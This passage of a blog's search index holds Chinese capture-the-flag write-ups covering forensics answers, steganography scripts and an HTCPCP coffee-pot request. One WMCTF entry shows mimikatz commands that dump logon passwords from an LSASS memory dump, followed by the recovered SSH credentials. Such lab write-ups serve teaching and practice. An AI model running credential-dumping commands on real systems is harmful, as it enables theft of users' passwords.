class="line">U2FsdGVkX19dHyROKCNrT5BAJk9asDpaZ8L45vr9s9D2Yi9/OX5Xl6lEmhd0VoietsmeiLHJjPPG0uSsdxGgr2jzQ00FEMf/VglaSrhwumM=</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693048789983-c0551b78-cffe-474a-a692-5398b109a628.png" alt="image.png"><br>但是解出的密钥无法写出压缩包，尝试重置密码<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693048855935-7454b889-0656-47b0-bdf9-ff8809152a3d.png" alt="image.png"><br>解压修改table后缀为文件<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693048925138-801e195c-da47-453f-8405-dc8166dbb499.png" alt="table.png"><br>对应 key 的鼠标轨迹解出  a91e37bf<br>在线网站解密出答案<br>part2: 3a-f140-2626195942a0} the other part is in the password<br>前半部分在password里，尝试<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693049403704-fe36b6a8-0abd-4364-940c-2799ed28672f.png" alt="image.png"><br>  flag{194a019a-1767-913a-f140-2626195942a0}</p><h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693045268262-3538fd69-8884-4e9b-80ab-374281f69098.png" alt="image.png"><br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693044846261-a5e4eeba-f0d2-49d9-8f24-9ebd12240b72.png" alt="image.png"><br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693045449258-2358dcae-5716-4ce9-a6c0-f39f1fe3370c.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]</span><br><span class="line">com.vestas.app</span><br><span class="line"></span><br><span class="line">【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]</span><br><span class="line">0x563b45ca</span><br><span class="line"></span><br><span class="line">【APK取证】涉案apk的服务器域名是？[答题格式:http://sles.vips.com]</span><br><span class="line">https://vip.licai.com</span><br><span class="line"></span><br><span class="line">【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]</span><br><span class="line">io.dcloud.PandoraEntry</span><br></pre></td></tr></table></figure><h2 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证"></a>手机取证</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]</span><br><span class="line">雷电模拟器</span><br></pre></td></tr></table></figure><p>雷电模拟器还原镜像<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693050392717-9699abdb-9c7e-4ded-8448-6e07842b41ca.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]</span><br><span class="line">与你</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693050631309-3a9e4b53-7544-4bc8-abb7-9f59c70f4a6c.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]</span><br><span class="line">com.uneed.yuni</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693050698263-6e62ea4e-fbb2-48a0-a857-5eac908f35fc.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]</span><br><span class="line">5万</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693050751074-dd5ace42-0435-40dd-ad45-a03934a08044.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]</span><br><span class="line">华哥</span><br></pre></td></tr></table></figure><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693051248741-9276b383-5683-4bce-ba97-0b027fa3fcd3.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root/admin]</span><br><span class="line">yang88/3w.qax.com</span><br><span class="line"></span><br><span class="line">【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]</span><br><span class="line">3w.qax.com!!@@</span><br><span class="line"></span><br><span class="line">veracrypt解密后挂载打开xlsx</span><br><span class="line">【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]</span><br><span class="line">1019</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693045575979-bfb0980c-8a0a-4760-9cc5-aaecc3b30a6a.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]</span><br><span class="line">23f861b2e9c5ce9135afc520cbd849677522f54c</span><br></pre></td></tr></table></figure><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693046029465-6684201f-11a2-48d2-b720-a026745a668f.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]</span><br><span class="line">2023-06-21 01:02:27</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693046409509-abed2d07-a425-4712-97c9-c9ab244efa51.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]</span><br><span class="line">3w.qax.com</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693046606559-421abe2b-4336-4ede-b3e8-e39ce34089af.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]</span><br><span class="line">2023-06-21 00:47:41</span><br></pre></td></tr></table></figure><h2 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h2><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693046741992-d94d1d78-3134-46ea-84dc-26b1858c4912.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]</span><br><span class="line">pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com</span><br></pre></td></tr></table></figure><p><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693046783274-a31c65c1-ffd4-4079-bdd6-a648e08e1023.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]</span><br><span class="line">5.7.40</span><br></pre></td></tr></table></figure><p>导出WWW挂载拟真服务器，前台<br><img src="/2023-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-MISC-WP/1693099969183-ac0105f3-03f2-47d7-b7e2-544421f3f6eb.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]</span><br><span class="line">4.00%</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 WMCTF MISC WP</title>
      <link href="/2023-WMCTF-MISC-WP/"/>
      <url>/2023-WMCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="oversharing"><a href="#oversharing" class="headerlink" title="oversharing"></a>oversharing</h2><p><img src="/2023-WMCTF-MISC-WP/1692581253302-7ed32cd7-4ccf-4057-b705-a4d75bd73067.png" alt="image.png"><br>文件中有lsass.DMP ，使用 mimikatz 进行提取用户密码<br>导出 lsass.DMP 修改文件名为 lsass.dmp 并使用 mimikatz x64 载入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><p><img src="/2023-WMCTF-MISC-WP/1692581950905-29b7f36f-669a-44ae-8ccb-41373a040569.png" alt="image.png"><br>获得 ssh 的用户名与密码 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Domain   : ssh@192.168.20.202:22/randark</span><br><span class="line">* Password : 1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e</span><br><span class="line"></span><br><span class="line">cat flag</span><br><span class="line">WMCTF&#123;9f1690f4-7b41-429f-a243-505997079997&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023-WMCTF-MISC-WP/1692582072121-611f38c3-4ba9-4b67-9246-998faff93942.png" alt="image.png"></p><h2 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a>Fantastic terminal</h2><p>非预期解，在 out.warms 中读取flag<br><img src="/2023-WMCTF-MISC-WP/1692585425550-7e17a2f1-701c-4647-bdde-4c6f1725995d.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;fanta3t1c_term1nal_1n_the_c0nta1ner_1n_the_br0w3er&#125;</span><br></pre></td></tr></table></figure><h2 id="Fantastic-terminal-Rev"><a href="#Fantastic-terminal-Rev" class="headerlink" title="Fantastic terminal Rev"></a>Fantastic terminal Rev</h2><p>此题修复了之前的可以直接从 out.warms 读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t wmctf . </span><br><span class="line">docker run -it wmctf </span><br></pre></td></tr></table></figure><p>启动终端后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd challenge</span><br><span class="line">base64 challenge</span><br><span class="line"></span><br><span class="line">因为要获取challenge这个文件，但是直接cat字符编码是错误的，最好是将源文件可以完整保存下来</span><br><span class="line"></span><br><span class="line">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAYBEAAAAAAABAAAAAAAAAAEAxAAAAAAAAAAAAAE</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">AAAAAAAAAAAAAAAAAA==</span><br></pre></td></tr></table></figure><p>base64 解码后将 challenge 在IDA中进行反编译<br>动态调试获得flag<br>![&#96;)I8H69}K3@TWTZ)(7C76(0.png](2023-WMCTF-MISC-WP&#x2F;1692585251475-713e3dc8-1867-4fc6-942b-ee5ce921975b.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;r3venge_terminal_after_fuck1ng_paatchhhhhhhhhhhhh&#125;</span><br></pre></td></tr></table></figure><h1 id="STEG"><a href="#STEG" class="headerlink" title="STEG"></a>STEG</h1><h2 id="EZ-V1dio"><a href="#EZ-V1dio" class="headerlink" title="EZ_V1dio"></a>EZ_V1dio</h2><p>下载得到 avi 音频，尝试分离每一帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">if not os.path.exists(&#x27;frames&#x27;):</span><br><span class="line">    os.makedirs(&#x27;frames&#x27;)</span><br><span class="line"></span><br><span class="line">video = cv2.VideoCapture(&#x27;./flag.avi&#x27;)</span><br><span class="line">frame_count = 0</span><br><span class="line">while True:</span><br><span class="line">    ret, frame = video.read()</span><br><span class="line">    if not ret:</span><br><span class="line">        break</span><br><span class="line">    filename = f&#x27;frames/frame_&#123;frame_count&#125;.jpg&#x27;</span><br><span class="line">    cv2.imwrite(filename, frame)</span><br><span class="line">    frame_count += 1</span><br><span class="line"></span><br><span class="line">video.release()</span><br></pre></td></tr></table></figure><p>在第一帧的R0通道看到 W 字符<br><img src="/2023-WMCTF-MISC-WP/1692585915094-e9ed23a9-eb9c-43c2-b2d2-23a009edd63f.png" alt="image.png"><br>分离每一帧的R0通道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">if not os.path.exists(&#x27;R0&#x27;):</span><br><span class="line">    os.makedirs(&#x27;R0&#x27;)</span><br><span class="line"></span><br><span class="line">video = cv2.VideoCapture(&#x27;./flag.avi&#x27;)</span><br><span class="line"></span><br><span class="line">frame_count = 0</span><br><span class="line">while True:</span><br><span class="line">    ret, frame = video.read()</span><br><span class="line">    if not ret:</span><br><span class="line">        break</span><br><span class="line">    r_channel = frame[:, :, 2]  # OpenCV默认通道顺序为BGR，索引2为R通道</span><br><span class="line">    r_lowest_bit = r_channel &amp; 1</span><br><span class="line">    r_lowest_bit &lt;&lt;= 7</span><br><span class="line">    filename = f&#x27;R0/frame_&#123;frame_count&#125;.jpg&#x27;</span><br><span class="line">    cv2.imwrite(filename, r_lowest_bit)</span><br><span class="line">    frame_count += 1</span><br><span class="line"></span><br><span class="line">video.release()</span><br></pre></td></tr></table></figure><p><img src="/2023-WMCTF-MISC-WP/1692585674889-9d4d10ce-e00b-4f23-b75c-74f3e7944284.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">去除重复后得到</span><br><span class="line">WMCTF&#123;5b658ab9-946c-3869-fc21-6ad99b3bc714&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 DASCTF&amp;0x401 MISC WP</title>
      <link href="/2023-DASCTF-0x401-MISC-WP/"/>
      <url>/2023-DASCTF-0x401-MISC-WP/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023-DASCTF-0x401-MISC-WP/image-20240213132920327.png" alt="image-20240213132920327"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>DASCTF{DASCTF7_0x401_Happy}</p><h3 id="ezFAT32"><a href="#ezFAT32" class="headerlink" title="ezFAT32"></a>ezFAT32</h3><p><img src="/2023-DASCTF-0x401-MISC-WP/1690022610256-d1eab9db-6bbc-4b8d-9600-df6825a09321.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i misc2.zip -T 分离出flag.zip压缩包</span><br></pre></td></tr></table></figure><p><img src="/2023-DASCTF-0x401-MISC-WP/1690022710052-0feed2e1-0fc7-45b2-90f8-8ca3dbd2d437.png" alt="image.png"><br>R-studio 扫描得到一个hint和一张bitmap，导出bmp进行sha256得到sha值<br>1bec3826d44f706d33e8cc4bc230d3113d0198261ff1cd251294dbdebabb0af5<br>解压flag.zip得到flag<br>dasctf{Yep_Y0u_F1nd_The_F1ag!Suff3r_t0_rec0ver}</p><h3 id="Coffee-desu"><a href="#Coffee-desu" class="headerlink" title="Coffee desu!"></a>Coffee desu!</h3><p>参考链接 <a href="https://blog.csdn.net/weixin_42319408/article/details/103084128">https://blog.csdn.net/weixin_42319408&#x2F;article&#x2F;details&#x2F;103084128</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">使用BREW 制作咖啡，并将Accept-Additions 加入物改成milktea，Accept: application/coffee-pot-command</span><br><span class="line">BREW / HTTP/1.1</span><br><span class="line">Host: 8853ec2d-03d9-4af0-b6d2-1424b50e0962.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: application/coffee-pot-command</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 0</span><br><span class="line">Accept-Additions: milktea</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023-DASCTF-0x401-MISC-WP/1690030321427-e18d64b1-d9d3-4bb3-a125-794d26ff5948.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在使用GET 获取咖啡</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 8853ec2d-03d9-4af0-b6d2-1424b50e0962.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: application/coffee-pot-command</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 0</span><br><span class="line">Accept-Additions: milktea</span><br></pre></td></tr></table></figure><p><img src="/2023-DASCTF-0x401-MISC-WP/1690031191558-e1a8c31e-4039-4aea-852e-2da8e47f4dd6.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
